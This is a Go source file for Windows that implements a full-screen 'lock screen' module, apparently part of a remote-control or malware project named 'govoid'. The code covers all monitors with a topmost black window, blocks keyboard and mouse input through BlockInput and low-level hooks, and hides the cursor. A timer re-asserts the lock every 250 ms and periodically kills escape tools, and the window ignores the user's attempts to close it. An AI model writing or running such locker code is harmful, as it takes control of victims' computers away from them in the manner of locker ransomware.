//go:build windows

package win32

import (
	"errors"
	"fmt"
	"runtime"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"github.com/local/govoid/internal/config"
)

type LockScreen struct {
	mu       sync.Mutex
	active   bool
	hwnd     uintptr
	started  time.Time
	expires  time.Time
	allowEnd atomic.Bool
	ticks    atomic.Uint64
	done     chan struct{}
	timeout  bool
}

var DefaultLock = &LockScreen{}

var ErrLocked = errors.New("lockscreen: ya está bloqueado")

var lockWindows sync.Map

var lockClassSeq atomic.Uint64

func (l *LockScreen) Active() bool {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.active
}

func (l *LockScreen) TimedOut() bool {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.timeout
}

func (l *LockScreen) Start(duration time.Duration) error {
	l.mu.Lock()
	if l.active {
		l.mu.Unlock()
		return ErrLocked
	}
	l.active = true
	l.timeout = false
	l.started = time.Now()
	if duration > 0 {
		l.expires = l.started.Add(duration)
	} else {
		l.expires = time.Time{}
	}
	l.allowEnd.Store(false)
	l.ticks.Store(0)
	l.done = make(chan struct{})
	ready := make(chan error, 1)
	done := l.done
	l.mu.Unlock()

	go l.run(ready, done)

	select {
	case err := <-ready:
		if err != nil {
			l.mu.Lock()
			l.active = false
			l.mu.Unlock()
			return err
		}
		return nil
	case <-time.After(5 * time.Second):
		l.mu.Lock()
		l.active = false
		l.mu.Unlock()
		return errors.New("lockscreen: la ventana no apareció a tiempo")
	}
}

func (l *LockScreen) Stop() bool {
	l.mu.Lock()
	if !l.active || l.hwnd == 0 {
		l.mu.Unlock()
		return false
	}
	hwnd := l.hwnd
	done := l.done
	l.mu.Unlock()

	l.allowEnd.Store(true)
	procPostMessageW.Call(hwnd, wmClose, 0, 0)

	select {
	case <-done:
		return true
	case <-time.After(5 * time.Second):
		procPostMessageW.Call(hwnd, wmDestroy, 0, 0)
		return true
	}
}

func (l *LockScreen) run(ready chan<- error, done chan struct{}) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	defer close(done)

	className, err := syscall.UTF16PtrFromString(
		fmt.Sprintf("%s%d", config.WindowClassPrefix, lockClassSeq.Add(1)))
	if err != nil {
		ready <- err
		return
	}
	title, _ := syscall.UTF16PtrFromString("")

	instance, _, _ := procGetModuleHandleW.Call(0)
	if instance == 0 {
		ready <- errors.New("lockscreen: GetModuleHandle falló")
		return
	}

	brush, _, _ := procCreateSolidBrush.Call(0)
	if brush == 0 {
		ready <- errors.New("lockscreen: CreateSolidBrush falló")
		return
	}
	defer procDeleteObject.Call(brush)

	var wc wndClassEx
	wc.Size = uint32(unsafe.Sizeof(wc))
	wc.Style = csHRedraw | csVRedraw
	wc.WndProc = syscall.NewCallback(lockWndProc)
	wc.Instance = instance
	wc.Background = brush
	wc.ClassName = className

	atom, _, registerErr := procRegisterClassExW.Call(uintptr(unsafe.Pointer(&wc)))
	if atom == 0 {
		ready <- fmt.Errorf("lockscreen: RegisterClassEx: %v", registerErr)
		return
	}

	x, y, width, height := virtualScreen()

	hwnd, _, createErr := procCreateWindowExW.Call(
		wsExTopmost|wsExToolWindow|wsExLayered,
		uintptr(unsafe.Pointer(className)),
		uintptr(unsafe.Pointer(title)),
		wsPopup|wsVisible,
		uintptr(int32(x)),
		uintptr(int32(y)),
		uintptr(int32(width)),
		uintptr(int32(height)),
		0, 0, instance, 0,
	)
	if hwnd == 0 {
		ready <- fmt.Errorf("lockscreen: CreateWindowEx: %v", createErr)
		return
	}

	l.mu.Lock()
	l.hwnd = hwnd
	l.mu.Unlock()
	lockWindows.Store(hwnd, l)

	procSetLayeredWindowAttributes.Call(hwnd, 0, 255, lwaAlpha)

	procShowWindow.Call(hwnd, swShow)
	procSetForegroundWindow.Call(hwnd)
	procSetFocus.Call(hwnd)
	procSetWindowPos.Call(hwnd, hwndTopmost, 0, 0, 0, 0,
		swpNoMove|swpNoSize|swpShowWindow)

	procBlockInput.Call(1)
	hideCursor()

	kbHook, _, _ := procSetWindowsHookExW.Call(whKeyboardLL,
		syscall.NewCallback(lockKeyProc), instance, 0)
	msHook, _, _ := procSetWindowsHookExW.Call(whMouseLL,
		syscall.NewCallback(lockMouseProc), instance, 0)

	procSetTimer.Call(hwnd, lockTimerID, lockTimerMS, 0)

	ready <- nil

	var message msg
	for {
		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&message)), 0, 0, 0)
		switch int32(ret) {
		case -1, 0:
			l.teardown(hwnd, kbHook, msHook)
			return
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&message)))
		procDispatchMessageW.Call(uintptr(unsafe.Pointer(&message)))
	}
}

func (l *LockScreen) teardown(hwnd, kbHook, msHook uintptr) {
	if kbHook != 0 {
		procUnhookWindowsHookEx.Call(kbHook)
	}
	if msHook != 0 {
		procUnhookWindowsHookEx.Call(msHook)
	}

	procKillTimer.Call(hwnd, lockTimerID)
	procBlockInput.Call(0)
	showCursor()
	lockWindows.Delete(hwnd)
	procDestroyWindow.Call(hwnd)

	l.mu.Lock()
	l.active = false
	l.hwnd = 0
	l.mu.Unlock()
}

func lockWndProc(hwnd, msg, wparam, lparam uintptr) uintptr {
	owner, _ := lockWindows.Load(hwnd)
	lock, _ := owner.(*LockScreen)

	switch msg {
	case wmClose:
		if lock != nil && lock.allowEnd.Load() {
			procDestroyWindow.Call(hwnd)
		}
		return 0
	case wmDestroy:
		procPostQuitMessage.Call(0)
		return 0
	case wmSysCommand:
		return 0
	case wmTimer:
		if wparam != lockTimerID || lock == nil {
			return 0
		}
		lock.reassert(hwnd)
		return 0
	case wmDisplayChange:
		x, y, width, height := virtualScreen()
		procSetWindowPos.Call(hwnd, hwndTopmost,
			uintptr(int32(x)), uintptr(int32(y)),
			uintptr(int32(width)), uintptr(int32(height)),
			swpShowWindow)
		return 0
	}
	result, _, _ := procDefWindowProcW.Call(hwnd, msg, wparam, lparam)
	return result
}

func (l *LockScreen) reassert(hwnd uintptr) {
	procSetWindowPos.Call(hwnd, hwndTopmost, 0, 0, 0, 0,
		swpNoMove|swpNoSize|swpShowWindow)
	procSetForegroundWindow.Call(hwnd)
	procBlockInput.Call(1)
	ensureCursorHidden()

	if l.expired() {
		l.mu.Lock()
		l.timeout = true
		l.mu.Unlock()
		l.allowEnd.Store(true)
		procDestroyWindow.Call(hwnd)
		return
	}

	if l.ticks.Add(1)%lockKillEvery == 0 {
		killEscapeTools()
	}
}

func (l *LockScreen) expired() bool {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.expires.IsZero() {
		return false
	}
	return time.Now().After(l.expires)
}

func lockKeyProc(code int32, wparam, lparam uintptr) uintptr {
	if code < 0 {
		next, _, _ := procCallNextHookEx.Call(0, uintptr(code), wparam, lparam)
		return next
	}
	return 1
}

func lockMouseProc(code int32, wparam, lparam uintptr) uintptr {
	if code < 0 {
		next, _, _ := procCallNextHookEx.Call(0, uintptr(code), wparam, lparam)
		return next
	}
	return 1
}

func virtualScreen() (x, y, width, height int) {
	const margin = 64

	left, _, _ := procGetSystemMetrics.Call(smXVirtualScreen)
	top, _, _ := procGetSystemMetrics.Call(smYVirtualScreen)
	wide, _, _ := procGetSystemMetrics.Call(smCxVirtualScreen)
	tall, _, _ := procGetSystemMetrics.Call(smCyVirtualScreen)

	if wide == 0 || tall == 0 {
		wide, _, _ = procGetSystemMetrics.Call(smCXScreen)
		tall, _, _ = procGetSystemMetrics.Call(smCYScreen)
		left, top = 0, 0
	}

	return int(int32(left)) - margin,
		int(int32(top)) - margin,
		int(int32(wide)) + 2*margin,
		int(int32(tall)) + 2*margin
}

func hideCursor() {
	for index := 0; index < 16; index++ {
		if shown, _, _ := procShowCursor.Call(0); int32(shown) < 0 {
			return
		}
	}
}

func ensureCursorHidden() {
	shown, _, _ := procShowCursor.Call(1)
	if int32(shown) > 0 {
		procShowCursor.Call(0)
		procShowCursor.Call(0)
		return
	}
	procShowCursor.Call(0)
}

func showCursor() {
	for index := 0; index < 16; index++ {
		if shown, _, _ := procShowCursor.Call(1); int32(shown) >= 0 {
			return
		}
	}
}

type wndClassEx struct {
	Size       uint32
	Style      uint32
	WndProc    uintptr
	ClsExtra   int32
	WndExtra   int32
	Instance   uintptr
	Icon       uintptr
	Cursor     uintptr
	Background uintptr
	MenuName   *uint16
	ClassName  *uint16
	IconSm     uintptr
}

const (
	csHRedraw = 0x0002
	csVRedraw = 0x0001

	wsPopup   = 0x80000000
	wsVisible = 0x10000000

	wsExTopmost    = 0x00000008
	wsExToolWindow = 0x00000080
	wsExLayered    = 0x00080000

	swShow = 5

	hwndTopmost = ^uintptr(0)

	swpNoSize     = 0x0001
	swpNoMove     = 0x0002
	swpShowWindow = 0x0040

	lwaAlpha = 0x00000002

	wmClose           = 0x0010
	wmDestroy         = 0x0002
	wmSysCommand      = 0x0112
	wmTimer           = 0x0113
	wmDisplayChange   = 0x007E
	wmEraseBackground = 0x0014

	whMouseLL = 14

	smXVirtualScreen  = 76
	smYVirtualScreen  = 77
	smCxVirtualScreen = 78
	smCyVirtualScreen = 79

	lockTimerID   = 1
	lockTimerMS   = 250
	lockKillEvery = 4
)

var (
	procGetModuleHandleW           = kernel32.NewProc("GetModuleHandleW")
	procRegisterClassExW           = user32.NewProc("RegisterClassExW")
	procCreateWindowExW            = user32.NewProc("CreateWindowExW")
	procDefWindowProcW             = user32.NewProc("DefWindowProcW")
	procDestroyWindow              = user32.NewProc("DestroyWindow")
	procPostQuitMessage            = user32.NewProc("PostQuitMessage")
	procPostMessageW               = user32.NewProc("PostMessageW")
	procShowWindow                 = user32.NewProc("ShowWindow")
	procSetForegroundWindow        = user32.NewProc("SetForegroundWindow")
	procSetFocus                   = user32.NewProc("SetFocus")
	procSetWindowPos               = user32.NewProc("SetWindowPos")
	procSetLayeredWindowAttributes = user32.NewProc("SetLayeredWindowAttributes")
	procSetTimer                   = user32.NewProc("SetTimer")
	procKillTimer                  = user32.NewProc("KillTimer")
	procBlockInput                 = user32.NewProc("BlockInput")
	procShowCursor                 = user32.NewProc("ShowCursor")
	procCreateSolidBrush           = gdi32.NewProc("CreateSolidBrush")
)
